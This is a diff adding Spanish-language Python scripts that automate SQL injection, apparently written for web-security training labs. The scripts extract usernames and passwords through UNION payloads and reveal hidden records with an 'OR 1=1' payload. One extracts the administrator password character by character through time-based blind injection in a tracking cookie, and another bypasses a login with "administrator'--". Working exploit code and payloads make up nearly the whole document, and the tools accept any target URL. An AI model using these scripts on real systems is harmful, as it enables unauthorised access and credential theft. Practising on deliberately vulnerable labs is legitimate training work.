+    print("\n\t\t" + Back.RED  + "Una herramienta para realizar SQL Injection" + Fore.RESET + Back.RESET + "\n")
+
+if __name__ == "__main__":
+    inicio()
+
+# recuperar_datos_de_otras_tablas.py
+
+import requests
+import sys
+import urllib3
+import urllib
+from bs4 import BeautifulSoup
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def exploit_tabla_usuarios(url, ruta):
+    HTML_PARSER = 'html.parser'
+    payload = "' UNION SELECT username, password FROM users--"
+    ruta_normal = url + ruta[1:]
+    ruta_a_atacar = url + ruta[1:] + payload
+    print("\nURL a atacar:")
+    print(ruta_a_atacar)
+    print("Desea realizar el ataque? (s/n): ")
+    realizar_ataque = input()
+    if realizar_ataque=="n":
+        return False
+
+    peticion_normal = requests.get(ruta_normal, verify=False)
+    html = peticion_normal.text
+    lista_tr_html = BeautifulSoup(html,HTML_PARSER).findAll('tr')
+
+    peticion_exploit = requests.get(ruta_a_atacar, verify=False)
+    html_exploited = peticion_exploit.text
+    lista_tr_html_exploited = BeautifulSoup(html_exploited,HTML_PARSER).findAll('tr')
+        
+    lista_tr_diferentes = []
+    for tr in lista_tr_html_exploited:
+        if tr not in lista_tr_html:
+            lista_tr_diferentes.append(tr)
+
+    print("\nResultados:\n")
+    print("Username\t\t\tPassword")
+    if (len(lista_tr_diferentes)>0):
+        for item in lista_tr_diferentes:
+            user = item.find('th').get_text()
+            password = item.find('td').get_text()
+            print(user+"\t\t\t"+password)
+        return True
+    return False
+
+def obtener_enlace_ataque(url):
+    peticion = requests.get(url)
+    html = peticion.text
+    soup = BeautifulSoup(html,HTML_PARSER)
+    section = soup.findAll('section')
+    section_filtros = section[len(section)-1]
+    enlaces = section_filtros.findAll('a')
+    print("Lista de enlaces de interes:")
+    for i in range(1,len(enlaces)):
+        print (str(i) + ". " + enlaces[i].contents[0])
+    print("¿Desde que enlace desea realizar el ataque?: ", end="")
+    enlace_ataque = int(input())
+    return enlaces[enlace_ataque]['href']
+
+
+if __name__ == "__main__":
+    print("\nIngrese la url del sitio: ", end="")
+    url = input()
+
+    try:
+        ruta = obtener_enlace_ataque(url)
+    except IndexError:
+        print("No se ha podido realizar la conexión, genere un nuevo enlace para intentar nuevamente.")
+        sys.exit(-1)
+
+    if not exploit_tabla_usuarios(url, ruta):
+        print ("[-] No se ha realizado el ataque")    
+
+
+# recuperar_datos_ocultos.py
+
+import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def encontrar_links_ataque(url):
+    r = requests.get(url, verify = False)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    categorias = soup.find_all('a', class_='filter-category')
+    print("\nSe han encontrado los siguientes links para realizar el ataque:\n")
+    
+    for i in range(len(categorias)):
+        if i>0:
+            print(f"{i}. {categorias[i].text} Enlace de ataque: {categorias[i]['href']}")
+    
+    print("\nIngrese el indice del enlace para realizar el ataque: ", end="")
+    indice = int(input())
+        
+    return categorias[indice]['href']
+    
+def peticion_normal(url):
+    return requests.get(url).text
+
+def peticion_vulnerada(url, uri):
+    sql_payload = "'OR 1=1 --"
+    print(f"\nAtacando la url: {url}{uri[1:]}{sql_payload}")
+    return requests.get(f"{url}{uri[1:]}{sql_payload}").text
+
+def analisis(html_normal, html_vulnerado):
+    PARSER = 'html.parser'
+    soup_normal = BeautifulSoup(html_normal, PARSER)
+    soup_vulnerado = BeautifulSoup(html_vulnerado, PARSER)
+    
+    lista_productos_normal = soup_normal.find_all('h3')
+    lista_productos_vulnerado = soup_vulnerado.find_all('h3')
+    
+    lista_oculto = []
+    for item in lista_productos_vulnerado:
+        if item not in lista_productos_normal:
+            lista_oculto.append(item)
+
+    print("\nLista de productos ocultos:\n")
+    
+    for item in lista_oculto:
+        print(item.text)
+    
+    print("\nSQL injection ejecutada con éxito")
+    
+def main():
+    print("\nIngrese la url del sitio: ", end="")
+    url = input()
+    uri = encontrar_links_ataque(url)
+    html_normal = peticion_normal(url)
+    html_vulnerado = peticion_vulnerada(url, uri)
+    analisis(html_normal, html_vulnerado)
+    
+
+if __name__ == "__main__":
+    main()
+
+# recuperar_multiples_valores_en_una_sola_columna.py
+
+import sys
+import requests
+import urllib3
+import urllib
+from bs4 import BeautifulSoup
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+PARSER = 'html.parser'
+SQL_PAYLOAD_BASE = "'+UNION+SELECT+"
+
+
+def obtener_credenciales_acceso(url, uri, numero_columnas_bd, columna_string, bbdd):
+    
+    caracter_concatenacion = ''
+    if bbdd == 'PostgreSQL':
+        caracter_concatenacion = '||'
+    cadena_credenciales = '+username+' + caracter_concatenacion + "+'-'+" + caracter_concatenacion + '+password'
+    
+    array_nulos = ['NULL'] * numero_columnas_bd
+    array_nulos[columna_string-1] = cadena_credenciales
+    sql_payload = SQL_PAYLOAD_BASE + ','.join(map(str,array_nulos)) + "+FROM+users"
+    respuesta_normal = requests.get(url + uri[1:], verify=False)
+    respuesta_vulnerada = requests.get(url + uri[1:] + sql_payload + "-- - ", verify=False)
+    
+      
+    print("\nURI de ataque:\n")
+    print(url + uri[1:] + sql_payload + "-- - " + "\n")
+    
+    lista_th_vulnerada = BeautifulSoup(respuesta_vulnerada.text, PARSER).find_all('th')
+    lista_th_normal = BeautifulSoup(respuesta_normal.text, PARSER).find_all('th')
+
+    credenciales = []
+    
+    for th in lista_th_vulnerada:
+        if th not in lista_th_normal:
+            credenciales.append(th)
+    
+    print("Credenciales de acceso al sistema:")
+    color_azul = "\033[94m"
+    reset_color = "\033[0m"
+    print(color_azul)
+    for credencial in credenciales:
+        print(credencial.get_text())
+    print(reset_color)
+    print("[+] La ejecución del script ha terminado satisfactoriamente.")
+            
+def determinar_bbdd(url, uri, numero_columnas_bd, columna_string):
+        
+    # postgresql
+    array_nulos = ['NULL'] * numero_columnas_bd
+    array_nulos[columna_string-1] = "version()"
+    sql_payload = SQL_PAYLOAD_BASE + ','.join(map(str,array_nulos))
+    respuesta_vulnerada = requests.get(url + uri[1:] + sql_payload + "-- - ", verify=False)
+    respuesta_normal = requests.get(url + uri[1:], verify=False)
+    
+    lista_th_vulnerada = BeautifulSoup(respuesta_vulnerada.text, PARSER).find_all('th')
+    lista_th_normal = BeautifulSoup(respuesta_normal.text, PARSER).find_all('th')
+    
+    if respuesta_vulnerada.status_code // 100 == 2:
+        print("[+] Tipo de base de datos: PostgreSQL")
+
+    th_bbdd = []
+    
+    for th in lista_th_vulnerada:
+        if th not in lista_th_normal:
+            th_bbdd.append(th)
+            
+    cadena = th_bbdd[0].get_text()
+    
+    inicio_parentesis = cadena.find("(")
+    fin_parentesis = cadena.find(")")
+    version_postgresql = cadena[:inicio_parentesis].strip()
+    sistema_operativo = cadena[inicio_parentesis + 1 : fin_parentesis].strip()
+
+    arquitectura_sistema = [parte for parte in cadena.split(",")][-1].strip()
+    
+    print("[+] Versión de PostgreSQL:", version_postgresql)
+    print("[+] Sistema Operativo:", sistema_operativo)
+    print("[+] Arquitectura del Sistema:", arquitectura_sistema)
+    
+    return 'PostgreSQL'
+            
+def obtener_fila_string(url, uri, numero_columnas_bd):
+    string_prueba = "'a'"
+
+    for i in range(numero_columnas_bd):
+        array_nulos = ['NULL'] * numero_columnas_bd
+        array_nulos[i] = string_prueba
+        sql_payload = SQL_PAYLOAD_BASE + ','.join(map(str,array_nulos))
+        respuesta = requests.get(url + uri[1:] + sql_payload + "-- - ", verify=False)
+        if respuesta.status_code // 100 == 2:
+            print("[+] Columna que contiene un tipo de dato string: %i" % (i+1))
+            return i+1
+    return False
+
+def obtener_numero_columnas_tabla(url, uri):
+    i=1
+    sql_payload = "'+UNION+SELECT+NULL"
+    while True:
+        peticion = requests.get(url+uri[1:]+sql_payload+"-- - ", verify=False)
+        if peticion.status_code // 100 ==  2:
+            print("\nInformación obtenida:\n")
+            print('[+] Numero de columnas: %i' % i)
+            return i 
+        sql_payload = sql_payload+",NULL"
+        i+=1
+    return False
+
+def obtener_enlace_ataque(url):
+    peticion = requests.get(url)
+    html = peticion.text
+    soup = BeautifulSoup(html, PARSER)
+    section = soup.findAll('section')
+    section_filtros = section[len(section)-1]
+    enlaces = section_filtros.findAll('a')
+    print("\nLista de enlaces de interes:\n")
+    for i in range(1,len(enlaces)):
+        print (str(i) + ". " + enlaces[i].contents[0])
+    print("\n¿Desde que enlace desea realizar el ataque?: ", end="")
+    enlace_ataque = int(input())
+    return enlaces[enlace_ataque]['href']
+
+def es_url_valida(url):
+    try:
+        respuesta = requests.get(url)
+        if respuesta.status_code // 100 == 2:
+            return True
+        else:
+            return False
+    except requests.ConnectionError:
+        return False
+    
+
+if __name__ == "__main__":
+     
+    print("\nIngrese la url del sitio a atacar: ", end="")
+    url = input()
+
+    if es_url_valida(url):
+        print("[+] URL válida. Procediendo con la ejecución del script...")
+        uri = obtener_enlace_ataque(url)
+        numero_columnas_bd = obtener_numero_columnas_tabla(url, uri)
+        columna_string = obtener_fila_string(url, uri, numero_columnas_bd)
+        bbdd = determinar_bbdd(url, uri, numero_columnas_bd, columna_string)
+        obtener_credenciales_acceso(url,uri,numero_columnas_bd,columna_string,bbdd)
+    else:
+        print("[-] URL inválida. Saliendo del sistema.")
+        sys.exit(-1)
+
+    
+
+# retraso_tiempo.py
+
+"""
+lab #14 - Blind SQL injection with time delays and information retrieval
+
+Vulnerable parameter - tracking cookie
+
+End goals:
+
+- Exploit time-based blind SQLi to output the administrator password
+- Login as the administrator user
+
+Analysis:
+1) Confirmar que el parametro es vulnerable a SQLi
+
+' || SELECT pg_sleep(10) --
+
+2) Confirm that the users table exists in the database
+
+' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) else pg_sleep(-1) END) --
+' || (SELECT CASE WHEN (1=0) THEN pg_sleep(10) else pg_sleep(-1) END ) --
+
+if the first query makes to sleep 10 seconds over the second query then this confirms that is a postgreSQL database
+
+3) Confirms that administrator user exists in the users table
+
+' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users) --
+
+4) Enumerate de password length
+
+' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>=0) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users) --
+
+4) Enumerate the administrator password
+' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users) --
+"""
+
+
+
+import requests
+import sys
+import urllib3
+import urllib
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def sqli_password(url, cookies):
+    password_extracted = ""
+    for i in range (1,21):
+        for j in range(32,126):
+            sqli_payload = "' AND (SELECT ASCII(SUBSTRING(password,{0},1)) FROM users WHERE username='administrator' AND LENGTH(password)>1) = '{1}' --".format(i,j)
+            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+            cookies['TrackingId'] += sqli_payload_encoded
+            r = requests.get(url, cookies=cookies)
+            if "Welcome" not in r.text:
+                sys.stdout.write('\r' + password_extracted + chr(j))
+                sys.stdout.flush()
+            else:
+                password_extracted += chr(j)
+                sys.stdout.write('\r' + password_extracted)
+                sys.stdout.flush()
+                break
+            
+def mensaje_de_salida(mensaje):
+    print(mensaje)
+    print('Saliendo del sistema')
+    sys.exit(-1)
+
+def obtener_cookies(url):
+    cookies = requests.get(url).cookies
+    cookies_dict = {cookie.name: cookie.value for cookie in cookies}
+    print("Cookies obtenidas:")
+    for idx, (name, value) in enumerate(cookies_dict.items(),1):
+        print(f"{idx}. {name}: {value}")
+    return cookies_dict
+
+def seleccionar_cookie():
+    print('Que cookie desea explotar?: ', end="")
+    indice =  int(input())
+    return (indice - 1)
+
+def confirmar_cookie_explotable(url, cookies, cookie_a_explotar, time_delay):
+    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
+    valor_original_cookie = cookies[nombre_cookie]
+    
+    sqli_payload_con_delay = f"' || (SELECT CASE WHEN (1=1) THEN pg_sleep({time_delay}) else pg_sleep(-1) END) --"
+    sqli_payload_encoded_con_delay = urllib.parse.quote(sqli_payload_con_delay)
+    cookies_con_delay = cookies
+    cookies_con_delay[nombre_cookie] += sqli_payload_encoded_con_delay
+    res_con_delay = requests.get(url, cookies = cookies_con_delay)
+    cookies[nombre_cookie] = valor_original_cookie
+    print(f'Tiempo de respuesta con delay: {res_con_delay.elapsed.total_seconds()}')
+    
+    sqli_payload_sin_delay = f"' || (SELECT CASE WHEN (1=0) THEN pg_sleep({time_delay}) else pg_sleep(-1) END) --"
+    sqli_payload_encoded_sin_delay = urllib.parse.quote(sqli_payload_sin_delay)
+    cookies_sin_delay = cookies
+    cookies_sin_delay[nombre_cookie] += sqli_payload_encoded_sin_delay
+    res_sin_delay = requests.get(url, cookies = cookies_sin_delay)
+    cookies[nombre_cookie] = valor_original_cookie
+    print(f'Tiempo de respuesta sin delay: {res_sin_delay.elapsed.total_seconds()}')
+
+
+    if res_con_delay.elapsed.total_seconds() > time_delay and res_sin_delay.elapsed.total_seconds() < time_delay:
+        print('(+) La base de datos es PostgreSQL')
+        print('(+) La base de datos es vulnerable a blind SQL injection con retraso en el tiempo de respuesta')
+        return True
+    return False
+
+def confirmar_tabla_users(url, cookies, cookie_a_explotar, time_delay):
+    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
+    valor_original_cookie = cookies[nombre_cookie]
+    sqli_payload = f"'|| (SELECT CASE WHEN EXISTS (SELECT 1 FROM information_schema.tables WHERE table_name = 'users') THEN pg_sleep({time_delay}) ELSE pg_sleep(-1) END) --"
+    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+    cookies[nombre_cookie] += sqli_payload_encoded
+    res = requests.get(url, cookies = cookies)
+    cookies[nombre_cookie] = valor_original_cookie
+
+    if res.elapsed.total_seconds() > time_delay:
+        print('(+) Existe una tabla users')
+        return True
+    return False
+
+def confirmar_usuario_administrator(url, cookies, cookie_a_explotar, time_delay):
+    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
+    valor_original_cookie = cookies[nombre_cookie]
+    
+    sqli_payload = f"' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep({time_delay}) ELSE pg_sleep(-1) END FROM users) --"
+    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+    cookies[nombre_cookie] += sqli_payload_encoded
+    res = requests.get(url, cookies=cookies)
+    cookies[nombre_cookie] = valor_original_cookie
+    
+    if res.elapsed.total_seconds() > time_delay:
+        print('(+) Existe un usuario administrador')
+        return True
+    return False
+def determinar_longitud_password(url, cookies, cookie_a_explotar, time_delay):
+    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
+    valor_original_cookie = cookies[nombre_cookie]
+    
+    inicio = 0
+    fin = 40
+
+    while inicio <= fin:
+        longitud_actual = (inicio + fin) // 2
+        sqli_payload = f"' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>={longitud_actual}) THEN pg_sleep({time_delay}) ELSE pg_sleep(-1) END FROM users) --"
+        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+        cookies[nombre_cookie] += sqli_payload_encoded
+        res = requests.get(url, cookies=cookies)
+        cookies[nombre_cookie] = valor_original_cookie
+        
+        if res.elapsed.total_seconds() > time_delay:
+            print(f'probando longitud del password: {longitud_actual}')
+            inicio = longitud_actual + 1
+        else:
+            fin = longitud_actual - 1
+
+    return fin
+    
+def obtener_password(url, cookies, cookie_a_explotar, longitud_password, time_delay):
+    password_extracted = ""
+    
+    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
+    valor_original_cookie = cookies[nombre_cookie]
+    
+    inicio = 32
+    fin =126
+    
+    for i in range (1,longitud_password+1):
+        for j in range(inicio,fin):
+            sqli_payload = f"' || (SELECT CASE WHEN (username='administrator' AND ASCII(SUBSTRING(password,{i},1))='{j}') THEN pg_sleep({time_delay}) ELSE pg_sleep(-1) END FROM users) --"
+            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+            cookies[nombre_cookie] += sqli_payload_encoded
+            r = requests.get(url, cookies=cookies)
+            cookies[nombre_cookie] = valor_original_cookie
+            time = r.elapsed.total_seconds()
+            if  time > time_delay:
+                password_extracted += chr(j)
+                sys.stdout.write('\r' + password_extracted)
+                sys.stdout.flush()
+                break
+            else:
+                sys.stdout.write('\r' + password_extracted + chr(j))
+                sys.stdout.flush()
+                
+    return password_extracted
+
+def main():
+    print("\nIngrese la url del sitio a atacar: ", end="")
+    url = input()
+    time_delay = 4 # segundos
+    cookies = obtener_cookies(url)
+    cookie_a_explotar = seleccionar_cookie()
+    
+    # 1) Confirmar que el parametro es vulnerable a blind SQL Injection
+    cookie_es_explotable = confirmar_cookie_explotable(url, cookies, cookie_a_explotar, time_delay)
+    if not cookie_es_explotable:
+        mensaje_de_salida('La cookie seleccionada no es explotable')
+            
+    # 2) Confirmar que existe una tabla users
+    existe_tabla_users = confirmar_tabla_users(url, cookies, cookie_a_explotar, time_delay)
+    if not existe_tabla_users:
+        mensaje_de_salida('No existe una tabla users')
+        
+    # 3) Confirmar que el usuario administrator existe en la tabla users
+    existe_usuario_administrator = confirmar_usuario_administrator(url, cookies, cookie_a_explotar, time_delay)
+    if not existe_usuario_administrator:
+        mensaje_de_salida('No existe el usuario administrador')
+
+    # 4) Enumerar el password de usuario administrator
+    longitud_password = determinar_longitud_password(url, cookies, cookie_a_explotar, time_delay)
+    print(f"(+) Longitud del password: {longitud_password} caracteres")
+    
+    # 5) Ataque de fuerza bruta probando caracter por caracter (se puede implementar un algoritmo de busqueda)
+    password = obtener_password(url, cookies, cookie_a_explotar, longitud_password, time_delay)
+    print(f"\nEl password obtenido es: {password}")
+    
+if __name__ == "__main__":
+    main()
+
+# saltar_inicio_sesion.py
+
+import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+PARSER = 'html.parser'
+
+def get_csrf_token(s, url):
+    print("\nIngresando a la ruta '/login'")
+    r = s.get(url+"login", verify=False)
+    soup = BeautifulSoup(r.text, PARSER)
+    csrf = soup.find("input")['value']
+    print(f"\nSe ha encontrado el siguiente CSRF-Token: {csrf}" )
+    return csrf
+
+def exploit_sqli(s, url, payload):
+    csrf = get_csrf_token(s, url)
+    password = "randomtext"
+    print(f"\nInyectando SQL payload: \"{payload}\" en el campo username")
+    print(f"Utilizando el password: \"{password}\" en el campo password ")
+    data = {"csrf": csrf,
+            "username": payload,
+            "password": password}
+    r = s.post(url+"login", data=data)
+    res = r.text
+    
+    if "Your username is: administrator" in res:
+        print("\nSe ha encontrado el siguiente fragmento de codigo HTML:\n")
+        print(BeautifulSoup(res, PARSER).find_all('p')[len(BeautifulSoup(res, PARSER).find_all('p'))-1])
+        print("\nLa inyeccion se ha realizado con exito")
+    else:
+        print("Ha fallado la inyección SQL.")
+    
+def main():
+    
+    print("\nIngrese la URL base del sitio a atacar: ", end="")
+    url = input()
+    s = requests.Session()
+    sqli_payload = "administrator'--"
+    exploit_sqli(s, url, sqli_payload)
+    
+if __name__ == "__main__":
+    main()
+
